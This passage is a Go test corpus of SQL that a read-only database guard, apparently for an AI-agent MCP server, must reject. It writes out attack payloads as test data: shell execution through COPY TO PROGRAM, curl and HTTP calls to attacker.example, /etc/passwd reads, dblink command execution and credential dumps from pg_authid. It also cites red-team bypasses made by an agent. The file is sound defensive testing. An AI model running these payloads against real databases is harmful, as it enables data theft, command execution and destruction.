// Package guardtest holds the guard's corpus: the bypasses it must reject and
// the reads it must allow. The guard's unit tests and the server's end-to-end
// tests both run it.
package guardtest

// Sources cited by the cases below:
//
//	[datadog]    https://securitylabs.datadoghq.com/articles/mcp-vulnerability-case-study-SQL-injection-in-the-postgresql-mcp-server/
//	[dbhub]      https://github.com/bytebase/dbhub/security/advisories/GHSA-mwwr-p57h-56pf
//	[pgedge]     https://github.com/pgEdge/pgedge-postgres-mcp/security/advisories/GHSA-j7mp-839j-jrm7
//	[awslabs]    https://github.com/awslabs/mcp/security/advisories/GHSA-fph8-pg5w-78fv
//	[crystaldba] https://github.com/crystaldba/postgres-mcp/issues/178
//	[v1]         bypasses of this server's v1 first-word blocklist
//	[lexer]      statement smuggling past a lexer that is not Postgres's own
//	[redteam]    bypasses of v2 confirmed by red-team runs
//	[review]     gaps in v2 found by code review
//	[policy]     the guard's own rules

// Case is SQL the guard must reject. Want is part of the reason, naming the
// statement type or function where there is one.
type Case struct {
	SQL  string
	Want string
}

// Rejected is the bypass corpus: SQL the guard must reject.
var Rejected = []Case{
	// --- More than one statement ---

	// [datadog] COMMIT ends the read-only transaction; DROP then runs read-write.
	{`COMMIT; DROP SCHEMA public CASCADE;`, "got 2"},
	// [datadog] Session state that outlives the call on a pooled connection.
	{`COMMIT; SET statement_timeout TO 1;`, "got 2"},
	// [pgedge] The simple protocol runs every statement of a message.
	{`SELECT 1; DELETE FROM app.orders`, "got 2"},
	// [lexer] A line comment ends at the newline, not at the end of the input.
	{"SELECT 1 -- note\n; DROP TABLE app.orders", "got 2"},
	// [lexer] "--" inside a string literal does not start a comment.
	{`SELECT '--', 1; DROP TABLE app.orders`, "got 2"},
	// [lexer] "/*" inside a string literal does not start a comment.
	{`SELECT '/*'; DROP TABLE app.orders; -- */`, "got 2"},
	// [lexer] Block comments nest: this one closes before the semicolon.
	{`SELECT 1 /* a /* b */ c */; DROP TABLE app.orders`, "got 2"},
	// [lexer] A dollar quote closes at the next "$$", not the last one.
	{`SELECT $$ $$; DROP TABLE app.orders; --$$`, "got 2"},
	// [pgedge] A value that closes the dollar-quote tag appends a statement.
	{`SELECT $q$x$q$; DROP TABLE app.orders; -- $q$`, "got 2"},
	// [lexer] In an E'' string, \' is an escaped quote, so '' closes it.
	{`SELECT E'\''; DROP TABLE app.orders; --'`, "got 2"},
	// [lexer] In a plain string a backslash is literal, so \' closes it.
	{`SELECT 'a\'; DROP TABLE app.orders; --'`, "got 2"},
	// [lexer] A U& identifier whose escape decodes to a double quote.
	{`SELECT U&"\0022"; DROP TABLE app.orders; --"`, "got 2"},
	// [lexer] A U& string with its own escape character.
	{`SELECT U&'!0027' UESCAPE '!'; DROP TABLE app.orders`, "got 2"},

	// --- Statements other than SELECT, EXPLAIN SELECT and SHOW ---

	// [datadog] Only the read-only transaction refused it there.
	{`DROP SCHEMA public CASCADE`, "DropStmt"},
	// [v1] [pgedge] A leading comment hid the first word.
	{`/**/ DROP TABLE app.orders`, "DropStmt"},
	// [pgedge] A leading line comment.
	{"-- note\nDELETE FROM app.orders", "DeleteStmt"},
	// [v1] SET was not blocked.
	{`SET statement_timeout = 0`, "VariableSetStmt"},
	// [v1] Read-only was only this session default.
	{`SET default_transaction_read_only = off`, "VariableSetStmt"},
	// [v1] Switch to a role with more privileges.
	{`SET ROLE postgres`, "VariableSetStmt"},
	// [v1] RESET is a VariableSetStmt too.
	{`RESET ALL`, "VariableSetStmt"},
	// [pgedge] READ WRITE was never checked.
	{`SET SESSION CHARACTERISTICS AS TRANSACTION READ WRITE`, "VariableSetStmt"},
	// [pgedge] READ WRITE for the current transaction.
	{`SET TRANSACTION READ WRITE`, "VariableSetStmt"},
	// [pgedge] READ WRITE when starting one.
	{`START TRANSACTION READ WRITE`, "TransactionStmt"},
	// [datadog] Transaction control ends the engine's transaction.
	{`COMMIT`, "TransactionStmt"},
	// [policy] Transaction control.
	{`BEGIN`, "TransactionStmt"},
	// [policy] Transaction control.
	{`ROLLBACK`, "TransactionStmt"},
	// [policy] Transaction control.
	{`SAVEPOINT s`, "TransactionStmt"},
	// [v1] MERGE passed the first-word blocklist.
	{`MERGE INTO app.orders o USING app.customers c ON o.customer_id = c.id WHEN MATCHED THEN DELETE`, "MergeStmt"},
	// [v1] DO passed the first-word blocklist.
	{`DO $$BEGIN DELETE FROM app.orders; END$$`, "DoStmt"},
	// [v1] CALL passed the first-word blocklist.
	{`CALL app.close_orders()`, "CallStmt"},
	// [awslabs] [v1] COPY ... TO PROGRAM runs a shell command.
	{`COPY (SELECT 1) TO PROGRAM 'id > /tmp/pwned'`, "CopyStmt"},
	// [awslabs] COPY ... FROM PROGRAM runs one and loads its output.
	{`COPY app.orders FROM PROGRAM 'curl -s https://attacker.example/rows.csv'`, "CopyStmt"},
	// [policy] COPY to a server file.
	{`COPY app.orders TO '/tmp/orders.csv'`, "CopyStmt"},
	// [policy] DML.
	{`INSERT INTO app.audit_log (message) VALUES ('x')`, "InsertStmt"},
	// [policy] DML.
	{`UPDATE app.orders SET status = 'paid'`, "UpdateStmt"},
	// [policy] DML.
	{`DELETE FROM app.orders`, "DeleteStmt"},
	// [policy] LISTEN/NOTIFY.
	{`LISTEN orders`, "ListenStmt"},
	// [policy] LISTEN/NOTIFY.
	{`NOTIFY orders, 'x'`, "NotifyStmt"},
	// [policy] LISTEN/NOTIFY.
	{`UNLISTEN *`, "UnlistenStmt"},
	// [policy] A prepared statement would run SQL the guard never sees.
	{`PREPARE p AS SELECT 1`, "PrepareStmt"},
	// [policy] Prepared statements.
	{`EXECUTE p`, "ExecuteStmt"},
	// [policy] Prepared statements.
	{`DEALLOCATE ALL`, "DeallocateStmt"},
	// [policy] Cursors.
	{`DECLARE c CURSOR FOR SELECT 1`, "DeclareCursorStmt"},
	// [policy] Cursors.
	{`FETCH ALL FROM c`, "FetchStmt"},
	// [policy] Locks.
	{`LOCK TABLE app.orders IN ACCESS EXCLUSIVE MODE`, "LockStmt"},
	// [policy] Maintenance.
	{`VACUUM app.orders`, "VacuumStmt"},
	// [policy] ANALYZE writes statistics.
	{`ANALYZE app.orders`, "VacuumStmt"},
	// [policy] Maintenance.
	{`CHECKPOINT`, "CheckPointStmt"},
	// [policy] Session state.
	{`DISCARD ALL`, "DiscardStmt"},
	// [policy] Loads a shared library into the backend.
	{`LOAD 'auto_explain'`, "LoadStmt"},
	// [policy] Rewrites a materialized view.
	{`REFRESH MATERIALIZED VIEW app.order_totals`, "RefreshMatViewStmt"},
	// [policy] DDL.
	{`CREATE TABLE app.t (id int)`, "CreateStmt"},
	// [policy] DDL.
	{`CREATE TABLE app.t AS SELECT 1`, "CreateTableAsStmt"},
	// [policy] DDL.
	{`ALTER TABLE app.orders ADD COLUMN x int`, "AlterTableStmt"},
	// [policy] DDL.
	{`TRUNCATE app.orders`, "TruncateStmt"},
	// [policy] DDL.
	{`CREATE EXTENSION dblink`, "CreateExtensionStmt"},
	// [policy] DDL.
	{`CREATE FUNCTION app.f() RETURNS int LANGUAGE sql AS 'SELECT 1'`, "CreateFunctionStmt"},
	// [policy] Privileges.
	{`GRANT ALL ON app.orders TO PUBLIC`, "GrantStmt"},
	// [policy] Server configuration.
	{`ALTER SYSTEM SET default_transaction_read_only = off`, "AlterSystemStmt"},
	// [policy] Role configuration.
	{`ALTER ROLE ro_clean SET default_transaction_read_only = off`, "AlterRoleSetStmt"},
	// [policy] Roles.
	{`CREATE ROLE admin SUPERUSER`, "CreateRoleStmt"},
	// [policy] Comments are catalog writes.
	{`COMMENT ON TABLE app.orders IS 'x'`, "CommentStmt"},

	// --- EXPLAIN ---

	// [dbhub] EXPLAIN ANALYZE runs the statement it explains.
	{`EXPLAIN ANALYZE INSERT INTO app.audit_log (message) VALUES ('x')`, "EXPLAIN of InsertStmt"},
	// [dbhub] The same with the parenthesized option list.
	{`EXPLAIN (ANALYZE) DELETE FROM app.orders`, "EXPLAIN of DeleteStmt"},
	// [policy] Only a SELECT can be explained, even without ANALYZE.
	{`EXPLAIN UPDATE app.orders SET status = 'paid'`, "EXPLAIN of UpdateStmt"},
	// [policy] EXPLAIN ANALYZE of CREATE TABLE AS creates the table.
	{`EXPLAIN ANALYZE CREATE TABLE app.t AS SELECT 1`, "EXPLAIN of CreateTableAsStmt"},
	// [policy] A prepared statement's SQL is not visible here.
	{`EXPLAIN ANALYZE EXECUTE p`, "EXPLAIN of ExecuteStmt"},
	// [policy] The explained SELECT is checked like any other.
	{`EXPLAIN ANALYZE SELECT * INTO app.t FROM app.orders`, "SELECT INTO"},
	// [policy] Including its WITH queries.
	{`EXPLAIN ANALYZE WITH d AS (DELETE FROM app.orders RETURNING *) SELECT * FROM d`, "DeleteStmt"},
	// [policy] And its function calls.
	{`EXPLAIN ANALYZE SELECT pg_terminate_backend(pid) FROM pg_stat_activity`, "pg_terminate_backend"},

	// --- Writes and locks inside a SELECT ---

	// [v1] [dbhub] A data-modifying WITH query.
	{`WITH gone AS (DELETE FROM app.orders RETURNING *) SELECT * FROM gone`, `"gone" is a DeleteStmt`},
	// [v1] INSERT in WITH.
	{`WITH x AS (INSERT INTO app.audit_log (message) VALUES ('x') RETURNING id) SELECT * FROM x`, "InsertStmt"},
	// [v1] UPDATE in WITH.
	{`WITH x AS (UPDATE app.orders SET status = 'paid' RETURNING id) SELECT count(*) FROM x`, "UpdateStmt"},
	// [v1] MERGE ... RETURNING in WITH (PostgreSQL 17).
	{`WITH m AS (MERGE INTO app.orders o USING app.customers c ON o.customer_id = c.id WHEN MATCHED THEN DELETE RETURNING o.id) SELECT * FROM m`, "MergeStmt"},
	// [policy] WITH inside a subquery.
	{`SELECT * FROM (WITH d AS (DELETE FROM app.orders RETURNING id) SELECT * FROM d) s`, "DeleteStmt"},
	// [policy] WITH inside another WITH query.
	{`WITH a AS (WITH d AS (DELETE FROM app.orders RETURNING id) SELECT * FROM d) SELECT * FROM a`, "DeleteStmt"},
	// [dbhub] SELECT INTO creates a table.
	{`SELECT * INTO app.orders_copy FROM app.orders`, "SELECT INTO"},
	// [policy] INTO in the first branch of a set operation.
	{`SELECT 1 INTO TEMP t UNION SELECT 2`, "SELECT INTO"},
	// [policy] Row locks.
	{`SELECT * FROM app.orders FOR UPDATE`, "FOR UPDATE"},
	// [policy] Row locks.
	{`SELECT * FROM app.orders FOR NO KEY UPDATE NOWAIT`, "FOR UPDATE"},
	// [policy] Row locks.
	{`SELECT * FROM app.orders FOR SHARE SKIP LOCKED`, "FOR UPDATE"},
	// [policy] Row locks.
	{`SELECT * FROM app.orders FOR KEY SHARE`, "FOR UPDATE"},
	// [policy] Row locks in a subquery.
	{`SELECT * FROM (SELECT * FROM app.orders FOR UPDATE) s`, "FOR UPDATE"},
	// [policy] Row locks in a WITH query.
	{`WITH l AS (SELECT id FROM app.orders FOR UPDATE) SELECT * FROM l`, "FOR UPDATE"},

	// --- Denied functions: the advisories' payloads ---

	// [dbhub] Sequences change outside the transaction.
	{`SELECT setval('users_id_seq', 1);`, "setval"},
	// [dbhub] Same for nextval.
	{`SELECT nextval('app.orders_id_seq')`, "nextval"},
	// [dbhub] Server file write through large objects.
	{`SELECT lo_export(lo_from_bytea(0, decode('48656c6c6f0a','hex')), '/tmp/dbhub_poc');`, "lo_export"},
	// [dbhub] Host file read.
	{`SELECT pg_read_file('/etc/passwd');`, "pg_read_file"},
	// [dbhub] A write through a second connection, outside the transaction.
	{`SELECT dblink_exec('dbname=app', 'UPDATE users SET admin=true');`, "dblink_exec"},
	// [dbhub] Remote command execution through that connection.
	{`SELECT dblink_exec('dbname=app', $$COPY (SELECT 1) TO PROGRAM 'id > /tmp/pwned'$$);`, "dblink_exec"},
	// [crystaldba] A call in FROM is a RangeFunction, not a target-list call.
	{`SELECT * FROM pg_read_file('/etc/passwd') AS t`, "pg_read_file"},
	// [crystaldba] The same gap for pg_ls_dir.
	{`SELECT * FROM pg_ls_dir('.') AS t`, "pg_ls_dir"},
	// [crystaldba] The same gap for pg_read_binary_file.
	{`SELECT * FROM pg_read_binary_file('/etc/passwd') AS t`, "pg_read_binary_file"},
	// [crystaldba] The same gap for pg_stat_file.
	{`SELECT * FROM pg_stat_file('postgresql.conf') AS t`, "pg_stat_file"},

	// --- Server configuration files through catalog views and functions ---
	// pg_read_file on these files is denied; these interfaces return the same
	// content. [redteam] is the confirmed v2 bypass: a superuser-connected
	// agent read the whole authentication policy with an ordinary SELECT.

	// [redteam] pg_hba_file_rules is a view returning pg_hba.conf; it is a
	// relation reference, not a function call, so it is denied as a relation.
	{`SELECT type, database, user_name, auth_method FROM pg_hba_file_rules`, "pg_hba_file_rules"},
	// [redteam] The exact exfiltration payload: string_agg over the view.
	{`SELECT string_agg(type||' '||array_to_string(database,',')||' '||auth_method, E'\n' ORDER BY line_number) FROM pg_hba_file_rules`, "pg_hba_file_rules"},
	// [redteam] Schema-qualified: still a relation reference to the same view.
	{`SELECT count(*) FROM pg_catalog.pg_hba_file_rules`, "pg_hba_file_rules"},
	// [redteam] pg_ident_file_mappings returns pg_ident.conf (PostgreSQL 15+).
	{`SELECT map_name, sys_name, pg_username FROM pg_ident_file_mappings`, "pg_ident_file_mappings"},
	// [redteam] pg_file_settings returns postgresql.conf and its include files,
	// with their absolute source paths.
	{`SELECT DISTINCT sourcefile FROM pg_file_settings WHERE sourcefile <> ''`, "pg_file_settings"},
	// [redteam] pg_show_all_file_settings() is the function behind that view,
	// called in FROM.
	{`SELECT * FROM pg_show_all_file_settings()`, "pg_show_all_file_settings"},
	// [redteam] And as a target-list call.
	{`SELECT pg_show_all_file_settings()`, "pg_show_all_file_settings"},
	// [redteam] pg_current_logfile() discloses the active log file's path.
	{`SELECT pg_current_logfile()`, "pg_current_logfile"},
	// [redteam] Its one-argument form.
	{`SELECT pg_current_logfile('csvlog')`, "pg_current_logfile"},
	// [policy] Called as a field: Postgres reads x.pg_current_logfile as the call.
	{`SELECT ('stderr'::text).pg_current_logfile`, "function pg_current_logfile"},

	// --- Denied relations read by name, with no reference to check ---

	// [review] table_to_xml takes a regclass: it returned pg_hba.conf as the superuser.
	{`SELECT table_to_xml('pg_catalog.pg_hba_file_rules', true, false, '')`, "table_to_xml"},
	// [review] Its sibling, for postgresql.conf with its paths.
	{`SELECT table_to_xml_and_xmlschema('pg_file_settings', true, false, '')`, "table_to_xml_and_xmlschema"},
	// [review] xpath() extracts the whole document, past the inline output limit.
	{`SELECT xpath('//auth_method/text()', table_to_xml('pg_hba_file_rules', true, false, ''))`, "table_to_xml"},
	// [review] xml2's xpath_table builds and runs SQL from its text arguments.
	{`SELECT * FROM xpath_table('k','d','pg_hba_file_rules','/x','true') AS t(k int, v text)`, "xpath_table"},
	// [policy] pageinspect returns a relation's raw pages, its rows included.
	{`SELECT encode(get_raw_page('pg_authid', 0), 'escape')`, "get_raw_page"},

	// --- Credentials in system catalogs and views ---
	// A superuser connection, which role_check warn admits, reads most of
	// them; the user-mapping views show a mapped role its own passwords.

	// [review] SCRAM or MD5 password verifiers.
	{`SELECT rolname, rolpassword FROM pg_authid`, "pg_authid"},
	// [review] The same, joined in.
	{`SELECT r.rolname FROM pg_roles r JOIN pg_catalog.pg_authid a ON a.oid = r.oid WHERE a.rolpassword IS NOT NULL`, "pg_authid"},
	// [review] The same, as a view.
	{`SELECT usename, passwd FROM pg_shadow`, "pg_shadow"},
	// [review] Foreign-server passwords.
	{`SELECT umuser, umoptions FROM pg_user_mapping`, "pg_user_mapping"},
	// [review] The same, shown to the mapped role itself.
	{`SELECT srvname, usename, umoptions FROM pg_user_mappings`, "pg_user_mappings"},
	// [policy] information_schema's view of them, likewise.
	{`SELECT option_name, option_value FROM information_schema.user_mapping_options`, "user_mapping_options"},
	// [policy] information_schema's base view of them.
	{`SELECT umoptions FROM information_schema._pg_user_mappings`, "_pg_user_mappings"},
	// [review] Subscription connection strings, passwords included.
	{`SELECT subname, subconninfo FROM pg_subscription`, "pg_subscription"},

	// --- Denied functions: v1 bypasses and spellings ---

	// [v1] query_to_xml runs the SQL string it is given.
	{`SELECT query_to_xml('DELETE FROM app.orders RETURNING 1', true, false, '')`, "query_to_xml"},
	// [v1] So does ts_stat.
	{`SELECT * FROM ts_stat('SELECT to_tsvector(message) FROM app.audit_log')`, "ts_stat"},
	// [v1] Schema-qualified dblink_exec.
	{`SELECT public.dblink_exec('dbname=app', 'DROP TABLE app.orders')`, "public.dblink_exec"},
	// [v1] Schema-qualified set_config.
	{`SELECT pg_catalog.set_config('default_transaction_read_only', 'off', false)`, "pg_catalog.set_config"},
	// [policy] Quoted upper case names a different function, but deny it anyway.
	{`SELECT "PG_CATALOG"."SET_CONFIG"('role', 'postgres', true)`, "pg_catalog.set_config"},
	// [policy] Unquoted upper case.
	{`SELECT DBLINK_EXEC('dbname=app', 'DROP TABLE app.orders')`, "dblink_exec"},
	// [lexer] A U& identifier that decodes to dblink_exec.
	{`SELECT U&"dblink\005Fexec"('dbname=app', 'DROP TABLE app.orders')`, "dblink_exec"},
	// [policy] A database-qualified name.
	{`SELECT app.pg_catalog.pg_reload_conf()`, "app.pg_catalog.pg_reload_conf"},

	// --- Denied functions called as a field: Postgres reads x.f as f(x) ---

	// [policy] Reads a server file with no FuncCall node in the tree.
	{`SELECT ('PG_VERSION'::text).pg_read_file`, "Postgres reads x.pg_read_file as pg_read_file(x)"},
	// [policy] Lists the data directory.
	{`SELECT ('.'::text).pg_ls_dir`, "function pg_ls_dir"},
	// [policy] Signals a backend.
	{`SELECT (pg_backend_pid()).pg_cancel_backend`, "function pg_cancel_backend"},
	// [policy] Runs its SQL string.
	{`SELECT ('SELECT to_tsvector(''a b'')'::text).ts_stat`, "function ts_stat"},
	// [policy] Opens a second connection.
	{`SELECT ('dbname=app'::text).dblink_connect`, "function dblink_connect"},
	// [policy] Creates a replication slot.
	{`SELECT ('s'::name).pg_create_physical_replication_slot`, "function pg_create_physical_replication_slot"},
	// [policy] Any field of the selection, not only the first.
	{`SELECT ('pg_wal'::text).upper.pg_ls_dir`, "function pg_ls_dir"},
	// [policy] rel.f is f(rel); for a scalar function in FROM, rel is that scalar.
	{`SELECT t.pg_ls_dir FROM unnest(ARRAY['.']) AS t`, "function pg_ls_dir"},
	// [policy] The same through a parenthesized relation.
	{`SELECT (t).pg_read_file FROM lower('PG_VERSION') AS t`, "function pg_read_file"},
	// [policy] A schema-qualified relation.
	{`SELECT app.orders.nextval FROM app.orders`, "function nextval"},
	// [policy] A qualified column that shares a denied name: the tree cannot tell.
	{`SELECT q.lo_price FROM app.quotes q`, "function lo_price"},

	// --- Denied functions: every place a call can hide ---

	// [crystaldba] WHERE.
	{`SELECT id FROM app.orders WHERE pg_cancel_backend(42)`, "pg_cancel_backend"},
	// [crystaldba] A scalar subquery.
	{`SELECT (SELECT pg_promote())`, "pg_promote"},
	// [crystaldba] EXISTS.
	{`SELECT 1 WHERE EXISTS (SELECT pg_ls_dir('.'))`, "pg_ls_dir"},
	// [crystaldba] LATERAL.
	{`SELECT c.id FROM app.customers c CROSS JOIN LATERAL pg_stat_file(c.name) s`, "pg_stat_file"},
	// [crystaldba] ROWS FROM.
	{`SELECT * FROM ROWS FROM (generate_series(1, 2), pg_ls_dir('.')) AS t(n, f)`, "pg_ls_dir"},
	// [policy] ORDER BY.
	{`SELECT id FROM app.orders ORDER BY pg_rotate_logfile()`, "pg_rotate_logfile"},
	// [policy] HAVING.
	{`SELECT status FROM app.orders GROUP BY status HAVING pg_reload_conf()`, "pg_reload_conf"},
	// [policy] An aggregate's FILTER.
	{`SELECT count(*) FILTER (WHERE pg_cancel_backend(pid)) FROM pg_stat_activity`, "pg_cancel_backend"},
	// [policy] An aggregate's ORDER BY.
	{`SELECT string_agg(message, ',' ORDER BY pg_notify('c', message)) FROM app.audit_log`, "pg_notify"},
	// [policy] A window's PARTITION BY.
	{`SELECT sum(id) OVER (PARTITION BY set_config('a.b', 'c', true)) FROM app.orders`, "set_config"},
	// [policy] A set operation's branches are SelectStmt fields, not Nodes.
	{`SELECT 1 UNION ALL SELECT dblink_exec('dbname=app', 'DROP TABLE app.orders')`, "dblink_exec"},
	// [policy] VALUES.
	{`VALUES (1), (pg_reload_conf()::int)`, "pg_reload_conf"},
	// [policy] LIMIT.
	{`SELECT * FROM app.orders LIMIT pg_cancel_backend(1)::int`, "pg_cancel_backend"},
	// [policy] CASE.
	{`SELECT CASE WHEN true THEN pg_notify('c', 'x') END`, "pg_notify"},
	// [policy] Nested arguments.
	{`SELECT upper(coalesce(pg_read_file('/etc/passwd'), ''))`, "pg_read_file"},
	// [policy] JSON constructor arguments.
	{`SELECT jsonb_build_object('f', pg_read_file('/etc/passwd'))`, "pg_read_file"},
	// [policy] JSON_TABLE's PASSING clause.
	{`SELECT jt.* FROM app.events e, JSON_TABLE(e.payload, '$' PASSING dblink_exec('dbname=app', 'DROP TABLE app.orders') AS v COLUMNS (id int PATH '$.id')) AS jt`, "dblink_exec"},
	// [policy] TABLESAMPLE arguments.
	{`SELECT * FROM app.orders TABLESAMPLE SYSTEM (pg_cancel_backend(1)::int)`, "pg_cancel_backend"},
	// [policy] XMLTABLE's PASSING clause.
	{`SELECT * FROM XMLTABLE('/r' PASSING CAST(pg_read_file('/x') AS xml) COLUMNS a int)`, "pg_read_file"},
	// [policy] JOIN ... ON.
	{`SELECT o.id FROM app.orders o JOIN app.customers c ON pg_cancel_backend(42)`, "pg_cancel_backend"},
	// [policy] A WITH query's SELECT.
	{`WITH t AS (SELECT dblink_exec('dbname=app', 'DROP TABLE app.orders')) SELECT * FROM t`, "dblink_exec"},
	// [policy] A recursive WITH query.
	{`WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT pg_cancel_backend(n)::int FROM r) SELECT * FROM r`, "pg_cancel_backend"},
	// [policy] An ARRAY subquery.
	{`SELECT ARRAY(SELECT lo_import('/etc/passwd'))`, "lo_import"},
	// [policy] DISTINCT ON.
	{`SELECT DISTINCT ON (pg_cancel_backend(1)) id FROM app.orders`, "pg_cancel_backend"},

	// --- Denied functions: the rest of the list ---

	// [policy] dblink*: a second connection, outside the transaction.
	{`SELECT * FROM dblink('dbname=app', 'SELECT 1') AS t(x int)`, "function dblink "},
	// [policy] dblink*.
	{`SELECT dblink_connect('c', 'dbname=app')`, "dblink_connect"},
	// [policy] lo_*: lo_import reads a server file.
	{`SELECT lo_import('/etc/passwd')`, "lo_import"},
	// [policy] lo_*.
	{`SELECT lo_unlink(16409)`, "lo_unlink"},
	// [policy] pg_logical_*: writes to WAL.
	{`SELECT pg_logical_emit_message(true, 'p', 'x')`, "pg_logical_emit_message"},
	// [policy] pg_logical_*: consumes a replication slot.
	{`SELECT * FROM pg_logical_slot_get_changes('s', NULL, NULL)`, "pg_logical_slot_get_changes"},
	// [redteam] pg_log_*: writes WAL, which READ ONLY does not stop and rollback does not undo.
	{`SELECT pg_log_standby_snapshot()`, "pg_log_standby_snapshot"},
	// [policy] heap_force_*: pg_surgery deletes a row in place, which READ ONLY and the rollback do not stop.
	{`SELECT heap_force_kill('app.orders'::regclass, ARRAY['(0,1)']::tid[])`, "heap_force_kill"},
	// [policy] heap_force_*: freezes a row in place.
	{`SELECT heap_force_freeze('app.orders'::regclass, ARRAY['(0,1)']::tid[])`, "heap_force_freeze"},
	// [policy] pg_visibility truncates a visibility map in place.
	{`SELECT pg_truncate_visibility_map('app.orders')`, "pg_truncate_visibility_map"},
	// [redteam] Summarizes BRIN ranges in place, past READ ONLY and the
	// rollback, as the superuser or the index's owner.
	{`SELECT brin_summarize_new_values('idx')`, "brin_summarize_new_values"},
	// [policy] The same for one range.
	{`SELECT brin_summarize_range('app.events_brin_idx', 0)`, "brin_summarize_range"},
	// [redteam] Deletes a BRIN range summary in place.
	{`SELECT brin_desummarize_range('idx', 0)`, "brin_desummarize_range"},
	// [redteam] Flushes a GIN index's pending list in place.
	{`SELECT gin_clean_pending_list('idx')`, "gin_clean_pending_list"},
	// [policy] Called as a field.
	{`SELECT ('idx'::regclass).gin_clean_pending_list`, "function gin_clean_pending_list"},
	// [policy] Advances the OID counter, which the rollback does not undo.
	{`SELECT pg_nextoid('pg_class', 'oid', 'pg_class_oid_index')`, "pg_nextoid"},
	// [redteam] Takes a transaction id that the rollback does not give back,
	// as any role: EXECUTE is PUBLIC.
	{`SELECT pg_current_xact_id()`, "pg_current_xact_id"},
	// [redteam] Its older name.
	{`SELECT txid_current()`, "txid_current"},
	// [policy] Writes pg_collation, taking a transaction id.
	{`SELECT pg_import_system_collations('public')`, "pg_import_system_collations"},
	// [policy] Writes planner statistics to pg_class, likewise (PostgreSQL 18).
	{`SELECT pg_restore_relation_stats('schemaname', 'app', 'relname', 'orders', 'reltuples', 1e9::real)`, "pg_restore_relation_stats"},
	// [policy] Deletes a column's statistics, likewise (PostgreSQL 18).
	{`SELECT pg_clear_attribute_stats('app', 'orders', 'status', false)`, "pg_clear_attribute_stats"},
	// [policy] pg_replication_*.
	{`SELECT pg_replication_origin_create('o')`, "pg_replication_origin_create"},
	// [policy] pg_create_*.
	{`SELECT pg_create_logical_replication_slot('s', 'test_decoding')`, "pg_create_logical_replication_slot"},
	// [policy] pg_create_*.
	{`SELECT pg_create_restore_point('r')`, "pg_create_restore_point"},
	// [policy] pg_drop_*.
	{`SELECT pg_drop_replication_slot('s')`, "pg_drop_replication_slot"},
	// [policy] pg_backup_*.
	{`SELECT pg_backup_start('b')`, "pg_backup_start"},
	// [policy] pg_switch_*.
	{`SELECT pg_switch_wal()`, "pg_switch_wal"},
	// [policy] Signals another session.
	{`SELECT pg_terminate_backend(pid) FROM pg_stat_activity`, "pg_terminate_backend"},
	// [policy] Signals another session.
	{`SELECT pg_cancel_backend(pid) FROM pg_stat_activity`, "pg_cancel_backend"},
	// [redteam] Signals another backend to dump its memory contexts to the
	// server log, outside the caller's statement_timeout.
	{`SELECT pg_log_backend_memory_contexts(1)`, "pg_log_backend_memory_contexts"},
	// [redteam] Every other backend at once, the log-amplification form.
	{`SELECT pg_log_backend_memory_contexts(pid) FROM pg_stat_activity WHERE pid <> pg_backend_pid()`, "pg_log_backend_memory_contexts"},
	// [policy] Server process control.
	{`SELECT pg_reload_conf()`, "pg_reload_conf"},
	// [policy] Server process control.
	{`SELECT pg_rotate_logfile()`, "pg_rotate_logfile"},
	// [policy] Server process control.
	{`SELECT pg_promote()`, "pg_promote"},
	// [policy] Settings.
	{`SELECT set_config('statement_timeout', '0', false)`, "set_config"},
	// [policy] Notifications.
	{`SELECT pg_notify('orders', 'x')`, "pg_notify"},
	// [policy] pg_net: any function in schema net.
	{`SELECT net.http_post('https://attacker.example/', 'x')`, "net.http_post"},
	// [policy] pg_net, quoted upper case.
	{`SELECT "NET"."HTTP_GET"('https://attacker.example/')`, "net.http_get"},
	// [policy] pg_net, a name not on any list.
	{`SELECT net._encode_url_with_params_array('https://attacker.example/', '{}')`, "net._encode_url_with_params_array"},
	// [review] RDS aws_s3: runs its SQL string and sends the rows to S3.
	{`SELECT * FROM aws_s3.query_export_to_s3('SELECT * FROM app.customers', aws_commons.create_s3_uri('attacker-bucket', 'c.csv', 'us-east-1'))`, "aws_s3.query_export_to_s3"},
	// [policy] RDS aws_s3: loads an S3 file into a table.
	{`SELECT aws_s3.table_import_from_s3('app.orders', '', '(format csv)', 'bucket', 'o.csv', 'us-east-1')`, "aws_s3.table_import_from_s3"},
	// [review] RDS aws_lambda: sends rows to a Lambda function, in any account.
	{`SELECT * FROM aws_lambda.invoke('arn:aws:lambda:us-east-1:000000000000:function:f', (SELECT json_agg(c) FROM app.customers c))`, "aws_lambda.invoke"},
	// [policy] aws_lambda, quoted upper case.
	{`SELECT "AWS_LAMBDA"."INVOKE"('f', '{}'::json)`, "aws_lambda.invoke"},
	// [review] pg_background runs its SQL string in a transaction of its own.
	{`SELECT pg_background_launch('DELETE FROM app.orders')`, "pg_background_launch"},
	// [review] And returns that statement's result.
	{`SELECT * FROM pg_background_result(pg_background_launch('UPDATE app.orders SET status = ''paid''')) AS (r text)`, "pg_background_result"},
	// [policy] pgsql-http, in any schema.
	{`SELECT http(('GET', 'https://attacker.example/', NULL, NULL, NULL)::http_request)`, "function http "},
	// [policy] pgsql-http.
	{`SELECT http_get('https://attacker.example/')`, "http_get"},
	// [policy] pgsql-http in Supabase's extensions schema.
	{`SELECT content FROM extensions.http_post('https://attacker.example/', 'x', 'text/plain')`, "extensions.http_post"},
	// [policy] pgsql-http.
	{`SELECT http_put('https://attacker.example/', 'x', 'text/plain')`, "http_put"},
	// [policy] pgsql-http.
	{`SELECT http_patch('https://attacker.example/', 'x', 'text/plain')`, "http_patch"},
	// [policy] pgsql-http.
	{`SELECT http_delete('https://attacker.example/')`, "http_delete"},
	// [policy] pgsql-http.
	{`SELECT http_head('https://attacker.example/')`, "http_head"},
	// [policy] Runs its SQL string.
	{`SELECT query_to_xml_and_xmlschema('SELECT 1', true, false, '')`, "query_to_xml_and_xmlschema"},
	// [policy] Runs its SQL string.
	{`SELECT query_to_xmlschema('SELECT 1', true, false, '')`, "query_to_xmlschema"},
	// [policy] Reads a cursor the guard never saw declared.
	{`SELECT cursor_to_xml('c', 10, true, false, '')`, "cursor_to_xml"},
	// [policy] Same family.
	{`SELECT cursor_to_xmlschema('c', true, false, '')`, "cursor_to_xmlschema"},
	// [policy] Runs a query per table of the database.
	{`SELECT database_to_xml(true, false, '')`, "database_to_xml"},
	// [policy] database_to_xml* family.
	{`SELECT database_to_xmlschema(true, false, '')`, "database_to_xmlschema"},
	// [policy] database_to_xml* family.
	{`SELECT database_to_xml_and_xmlschema(true, false, '')`, "database_to_xml_and_xmlschema"},
	// [policy] Runs a query per table of the schema.
	{`SELECT schema_to_xml('app', true, false, '')`, "schema_to_xml"},
	// [policy] schema_to_xml* family.
